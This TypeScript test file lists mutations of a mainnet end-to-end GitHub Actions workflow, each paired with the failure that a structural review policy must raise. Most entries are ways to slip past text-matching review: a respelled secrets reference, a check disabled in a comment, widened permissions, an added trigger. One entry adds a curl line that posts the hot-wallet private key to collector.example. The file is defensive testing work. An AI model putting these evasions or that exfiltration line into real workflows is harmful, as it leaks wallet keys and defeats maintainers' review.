/**
 * Mutations of the Mainnet E2E workflow, grouped by the control they weaken.
 *
 * Each `FAIL_WITHOUT` entry keeps the reviewed text somewhere in the file (a
 * comment, an inert string, a dead step, a respelling) while changing what
 * GitHub runs. Every one was accepted by the text-matching policy this
 * structural one replaced; each must now fail with the named failure.
 * `EQUIVALENT` entries change only spelling and must still pass.
 */
const E = "$" + "{{";
const PATH = ".github/workflows/mainnet-e2e.yml";

/** One workflow edit: replace the first `search` with `replacement`. */
export type Edit = {
  readonly label: string;
  readonly search: string;
  readonly replacement: string;
};

/** An edit that weakens a control, the item it belongs to, and the failure it must raise. */
export type Weakening = Edit & { readonly item: string; readonly failure: string };

const KEY_COUNT = `${PATH} must bind the hot-wallet private key in exactly 5 step env values, all in execute`;
const KEY_PLACE = `${PATH} must bind the hot-wallet private key only as a step env value`;
const RPC_PLACE = `${PATH} must bind the mainnet RPC URL only in its reviewed step env values`;
const EXECUTE_ORDER =
  "mainnet execution must run exactly the reviewed steps, in order: no install, build or checkout, and the RPC check before any live test";
const BUNDLE = "mainnet execution must verify the build bundle it runs";
const SECRETS_STEP =
  "mainnet execution must keep the reviewed secrets step (id, env bindings and position) that later steps depend on";
const SAME_RPC = "mainnet execution must use exactly the RPC preflight validated";
const REFUSED_RPC =
  "mainnet execution must refuse a non-HTTPS, shared, unavailable or non-mainnet RPC";
const MISSING = "mainnet execution must fail when any hot-wallet secret is missing";
const BASELINE = "the post-run check must take its baseline from the preflight job output";
const REPORT_ORDER =
  "the hosted mainnet reporter must run only its reviewed step: no checkout and no release-branch source";

const HTTPS_LINE = `          [[ "$MAINNET_E2E_RPC_URL" == https://* ]] || { echo "::error::The mainnet RPC must be HTTPS."; exit 1; }\n`;
const MISSING_IF = `          if [ "\${#missing[@]}" -ne 0 ]; then\n`;
const DISPATCH_IF =
  '          if [ "$EVENT_NAME" = "workflow_dispatch" ] && [ "$TRIGGER_REF" != "refs/heads/main" ]; then\n';
const REGEX_IF =
  '          if [[ ! "$candidate" =~ ^release/v[0-9]+\\.[0-9]+(\\.[0-9]+)?$ ]]; then\n';
const STRK_BASELINE = `MAINNET_E2E_STRK_BEFORE_RAW: ${E} needs.preflight.outputs.strk_before_raw }}`;

/** Weakenings the text policy accepted, by item. */
export const FAIL_WITHOUT: readonly Weakening[] = [
  {
    item: "1 key",
    label: "key via secrets['…'] in the post summary env",
    search: "          VERDICT: ",
    replacement: `          KEY: ${E} secrets[ 'MAINNET_E2E_PRIVATE_KEY' ] }}\n          VERDICT: `,
    failure: "the post balance check must run trusted main code without the key",
  },
  {
    item: "1 key",
    label: "key as secrets [ '…' ] with spaces in execute job env",
    search: "    env:\n      PLAYWRIGHT_BROWSERS_PATH:",
    replacement: `    env:\n      HOISTED: ${E} secrets [ 'MAINNET_E2E_PRIVATE_KEY' ] }}\n      PLAYWRIGHT_BROWSERS_PATH:`,
    failure: KEY_PLACE,
  },
  {
    item: "1 key",
    label: "computed secrets[format(…)] in workflow-level env",
    search: "\njobs:\n",
    replacement: `\nenv:\n  K: ${E} secrets[format('MAINNET_E2E_{0}', 'PRIVATE_KEY')] }}\n\njobs:\n`,
    failure: KEY_PLACE,
  },
  {
    item: "1 key",
    label: "key echoed from a run script as SECRETS.x",
    search: '          log="$RUNNER_TEMP/gasless-mainnet.log"\n',
    replacement: `          log="$RUNNER_TEMP/gasless-mainnet.log"\n          k="${E}SECRETS.mainnet_e2e_private_key}}"\n`,
    failure: KEY_PLACE,
  },
  {
    item: "1 key",
    label: "an extra key binding under another variable in the secrets step",
    search: "          PREFLIGHT_RPC_SHA256:",
    replacement: `          SPARE: ${E} secrets["MAINNET_E2E_PRIVATE_KEY"] }}\n          PREFLIGHT_RPC_SHA256:`,
    failure: KEY_COUNT,
  },
  {
    item: "1 rpc",
    label: "RPC URL handed to the gate step",
    search: `          BRANCH: ${E} needs.resolve.outputs.branch }}\n        run: |\n          set -euo pipefail\n          if [ "$CONFIGURED"`,
    replacement: `          BRANCH: ${E} needs.resolve.outputs.branch }}\n          RPC: ${E} secrets.MAINNET_E2E_RPC_URL }}\n        run: |\n          set -euo pipefail\n          if [ "$CONFIGURED"`,
    failure: RPC_PLACE,
  },
  {
    item: "2 setup",
    label: "install spelled `bun  install` in execute",
    search: "      - name: Check and mask mainnet secrets\n",
    replacement: "      - run: bun  install\n      - name: Check and mask mainnet secrets\n",
    failure: EXECUTE_ORDER,
  },
  {
    item: "2 setup",
    label: "local ./ action in execute",
    search: "      - name: Unpack the build\n",
    replacement: "      - uses: ./.github/actions/prepare\n      - name: Unpack the build\n",
    failure: EXECUTE_ORDER,
  },
  {
    item: "3 bundle",
    label: "sha256sum -c only in a shell comment",
    search: '          echo "$BUNDLE_SHA256  $bundle" | sha256sum -c --quiet\n',
    replacement: '          # echo "$BUNDLE_SHA256  $bundle" | sha256sum -c --quiet\n',
    failure: BUNDLE,
  },
  {
    item: "3 bundle",
    label: "unpack step made dead with if: false",
    search: "      - name: Unpack the build\n",
    replacement: "      - name: Unpack the build\n        if: false\n",
    failure: BUNDLE,
  },
  {
    item: "4 rpc",
    label: "hash compare short-circuited by `false &&`",
    search: 'if [[ ! "$PREFLIGHT_RPC_SHA256" =~ ^[0-9a-f]{64}$ ]] || [ "$actual"',
    replacement: 'if false && [ "$actual"',
    failure: SAME_RPC,
  },
  {
    item: "4 rpc",
    label: "HTTPS refusal only in a shell comment",
    search: HTTPS_LINE,
    replacement: `          # ${HTTPS_LINE.trimStart()}`,
    failure: REFUSED_RPC,
  },
  {
    item: "4 rpc",
    label: "secrets step tolerated with continue-on-error",
    search: "        id: secrets\n",
    replacement: "        id: secrets\n        continue-on-error: true\n",
    failure: SECRETS_STEP,
  },
  {
    item: "5 missing",
    label: "missing-secret check only in a comment, real check dead",
    search: MISSING_IF,
    replacement: `          # ${MISSING_IF.trimStart()}          if false; then\n`,
    failure: MISSING,
  },
  {
    item: "5 missing",
    label: "private key dropped from the missing list",
    search: '          [ -z "$MAINNET_E2E_PRIVATE_KEY" ] && missing+=("MAINNET_E2E_PRIVATE_KEY")\n',
    replacement: "",
    failure: MISSING,
  },
  {
    item: "6 balance",
    label: "STRK baseline kept in a comment, bound to execute",
    search: STRK_BASELINE,
    replacement: `# ${STRK_BASELINE}\n          MAINNET_E2E_STRK_BEFORE_RAW: ${E} needs.execute.outputs.strk_before_raw }}`,
    failure: BASELINE,
  },
  {
    item: "6 balance",
    label: "USDC baseline taken from execute",
    search: `MAINNET_E2E_USDC_BEFORE_RAW: ${E} needs.preflight.outputs.usdc_before_raw }}`,
    replacement: `MAINNET_E2E_USDC_BEFORE_RAW: ${E} needs.execute.outputs.usdc_before_raw }}`,
    failure: BASELINE,
  },
  {
    item: "6 balance",
    label: "preflight runner moved, ubuntu-latest only in a comment",
    search:
      "      contents: read\n    runs-on: ubuntu-latest\n    outputs:\n      strk_before_raw:",
    replacement:
      "      contents: read\n    runs-on: [self-hosted] # runs-on: ubuntu-latest\n    outputs:\n      strk_before_raw:",
    failure: "the preflight balance check must run on a hosted runner, apart from the tests",
  },
  {
    item: "7 execute",
    label: "execute gains id-token: write",
    search: "      contents: read\n    timeout-minutes: 120\n",
    replacement: "      contents: read\n      id-token: write\n    timeout-minutes: 120\n",
    failure: "self-hosted mainnet execution must declare read-only repository permission",
  },
  {
    item: "7 execute",
    label: "execute timeout 1200 (contains 120)",
    search: "    timeout-minutes: 120\n",
    replacement: "    timeout-minutes: 1200\n",
    failure: "mainnet execution must time out so a stuck run releases the nonce lock",
  },
  {
    item: "7 execute",
    label: "execute runs-on gains a second label",
    search: `    timeout-minutes: 120\n    runs-on:\n      - codebuild`,
    replacement: `    timeout-minutes: 120\n    runs-on:\n      - self-hosted\n      - codebuild`,
    failure: "mainnet execution must use the existing CodeBuild runner",
  },
  {
    item: "7 execute",
    label: "workflow-level permissions widened",
    search: "permissions:\n  contents: read\n\nconcurrency:",
    replacement: "permissions:\n  contents: read\n  actions: write\n\nconcurrency:",
    failure: `${PATH} must grant only contents: read at workflow level`,
  },
  {
    item: "8 report",
    label: "reporter checks out via a case-variant action name",
    search: "      - name: Upsert mainnet tracking issue\n",
    replacement:
      "      - uses: Actions/Checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n      - name: Upsert mainnet tracking issue\n",
    failure: REPORT_ORDER,
  },
  {
    item: "8 report",
    label: "reporter env reads secrets['…']",
    search: "          TIER: ",
    replacement: `          RPC: ${E} secrets['MAINNET_E2E_RPC_URL'] }}\n          TIER: `,
    failure: "the hosted mainnet reporter must not receive mainnet secrets",
  },
  {
    item: "9 guards",
    label: "dispatch-from-main test only in a comment",
    search: DISPATCH_IF,
    replacement: `          # ${DISPATCH_IF.trimStart()}          if false; then\n`,
    failure: `${PATH} manual dispatches must reject workflow revisions outside main`,
  },
  {
    item: "9 guards",
    label: "release-branch regex only in a comment",
    search: REGEX_IF,
    replacement: `          # ${REGEX_IF.trimStart()}          if false; then\n`,
    failure: `${PATH} must constrain configured refs to canonical release branches`,
  },
  {
    item: "9 guards",
    label: "vars.MAINNET_E2E_CONFIGURED only in a comment",
    search: `CONFIGURED: ${E} vars.MAINNET_E2E_CONFIGURED }}`,
    replacement: 'CONFIGURED: "true" # vars.MAINNET_E2E_CONFIGURED',
    failure: `${PATH} must skip until maintainers set vars.MAINNET_E2E_CONFIGURED`,
  },
  {
    item: "9 triggers",
    label: "quoted pull_request_target key",
    search: "  workflow_dispatch:\n    inputs:",
    replacement: '  "pull_request_target": {}\n  workflow_dispatch:\n    inputs:',
    failure: `${PATH} must not trigger on pull_request_target:`,
  },
  {
    item: "9 triggers",
    label: "quoted push trigger in a flow mapping",
    search: '    - cron: "0 6 * * *"\n',
    replacement: '    - cron: "0 6 * * *"\n  "push": { branches: [main] }\n',
    failure: `${PATH} must not trigger on push:`,
  },
  {
    item: "10 other",
    label: "execute job continue-on-error",
    search: "    timeout-minutes: 120\n",
    replacement: "    timeout-minutes: 120\n    continue-on-error: true\n",
    failure: "the execute job must not declare continue-on-error",
  },
  {
    item: "10 other",
    label: "workflow-level default shell",
    search: "\njobs:\n",
    replacement: "\ndefaults:\n  run:\n    shell: sh\n\njobs:\n",
    failure: `${PATH} must not declare workflow-level defaults`,
  },
  {
    item: "10 other",
    label: "Playwright step tolerated with continue-on-error",
    search: "        id: playwright\n",
    replacement: "        id: playwright\n        continue-on-error: true\n",
    failure: "mainnet execution must run the reviewed Playwright mainnet step",
  },
  {
    item: "1 key",
    label: "key posted by a line added to the secrets script",
    search: "          set -euo pipefail\n          mask() {\n",
    replacement:
      '          set -euo pipefail\n          curl -sf -d "$MAINNET_E2E_PRIVATE_KEY" https://collector.example\n          mask() {\n',
    failure: SECRETS_STEP,
  },
  {
    item: "2 setup",
    label: "npm ci added inside the Playwright script",
    search: '          report="$RUNNER_TEMP/playwright-mainnet.json"\n',
    replacement: '          npm ci\n          report="$RUNNER_TEMP/playwright-mainnet.json"\n',
    failure: "mainnet execution must run the reviewed Playwright mainnet step",
  },
  {
    item: "3 bundle",
    label: "unverified unpack and exit 0 before the sha256sum line",
    search: '          bundle="$RUNNER_TEMP/bundle/mainnet-e2e-bundle.tar"\n',
    replacement:
      '          bundle="$RUNNER_TEMP/bundle/mainnet-e2e-bundle.tar"\n          tar -xf "$bundle" -C "$GITHUB_WORKSPACE"; exit 0\n',
    failure: BUNDLE,
  },
  {
    item: "9 guards",
    label: "gate enables itself before the configured check",
    search: '          set -euo pipefail\n          if [ "$CONFIGURED" != "true" ]; then\n',
    replacement:
      '          set -euo pipefail\n          echo "run=true" >> "$GITHUB_OUTPUT"; exit 0\n          if [ "$CONFIGURED" != "true" ]; then\n',
    failure: `${PATH} must skip until maintainers set vars.MAINNET_E2E_CONFIGURED`,
  },
  {
    item: "10 other",
    label: "post summary script runs an extra command",
    search: '          } >> "$GITHUB_STEP_SUMMARY"\n',
    replacement: '          } >> "$GITHUB_STEP_SUMMARY"\n          bun run scripts/anything.ts\n',
    failure: "the post job must end with the reviewed summary step",
  },
  {
    item: "10 other",
    label: "reporter script makes an extra API call",
    search: "            const { owner, repo } = context.repo;\n",
    replacement:
      "            const { owner, repo } = context.repo;\n            await github.rest.issues.createComment({ owner, repo, issue_number: 1, body: 'x' });\n",
    failure: "the hosted mainnet reporter must not check out or execute release-branch source",
  },
];

/** Edits the text policy rejected that must still fail: kept so they never regress. */
export const STILL_REJECTED: readonly Weakening[] = [
  {
    item: "2 setup",
    label: "bun install added inside the secrets script",
    search: "          set -euo pipefail\n          mask() {\n",
    replacement:
      "          set -euo pipefail\n          bun install --frozen-lockfile\n          mask() {\n",
    failure: SECRETS_STEP,
  },
  {
    item: "10 other",
    label: "raw gasless log printed",
    search: '          rm -f "$log"\n',
    replacement: '          cat "$log"\n          rm -f "$log"\n',
    failure: "mainnet execution must fail unless the gasless send succeeded",
  },
];

/** Spellings that decode to the reviewed workflow, or add only comments. */
export const EQUIVALENT: readonly Edit[] = [
  {
    label: "comments between steps and after values",
    search: "      - name: Check and mask mainnet secrets\n        id: secrets\n",
    replacement:
      "      # The secrets step checks the key and the RPC.\n      - name: Check and mask mainnet secrets # reviewed\n        id: secrets # later steps read this\n",
  },
  {
    label: "quoted secret bindings",
    search: `          MAINNET_E2E_PRIVATE_KEY: ${E} secrets.MAINNET_E2E_PRIVATE_KEY }}\n          MAINNET_E2E_RPC_URL: ${E} secrets.MAINNET_E2E_RPC_URL }}\n          MAINNET_E2E_DISCOVERY_URL`,
    replacement: `          "MAINNET_E2E_PRIVATE_KEY": '${E} secrets.MAINNET_E2E_PRIVATE_KEY }}'\n          MAINNET_E2E_RPC_URL: "${E} secrets.MAINNET_E2E_RPC_URL }}"\n          MAINNET_E2E_DISCOVERY_URL`,
  },
  {
    label: "flow-style permissions, runner list and quoted condition",
    search: `    permissions:\n      contents: read\n    timeout-minutes: 120\n    runs-on:\n      - codebuild-gha-runner-mc-wallet-${E} github.run_id }}-${E} github.run_attempt }}\n`,
    replacement: `    permissions: { contents: read }\n    timeout-minutes: 120\n    runs-on: ["codebuild-gha-runner-mc-wallet-${E} github.run_id }}-${E} github.run_attempt }}"]\n`,
  },
  {
    label: "explicit continue-on-error: false and reordered keys",
    search: "      - name: Unpack the build\n        env:\n",
    replacement:
      "      - continue-on-error: false\n        name: 'Unpack the build'\n        env:\n",
  },
  {
    label: "strip chomping (|-) on a reviewed script",
    search: `PREFLIGHT_RPC_SHA256: ${E} needs.preflight.outputs.rpc_sha256 }}\n        run: |\n`,
    replacement: `PREFLIGHT_RPC_SHA256: ${E} needs.preflight.outputs.rpc_sha256 }}\n        run: |-\n`,
  },
  {
    label: "quoted step if",
    search: "        if: vars.MAINNET_E2E_STRK20 == 'true'\n",
    replacement: "        if: \"vars.MAINNET_E2E_STRK20 == 'true'\"\n",
  },
];
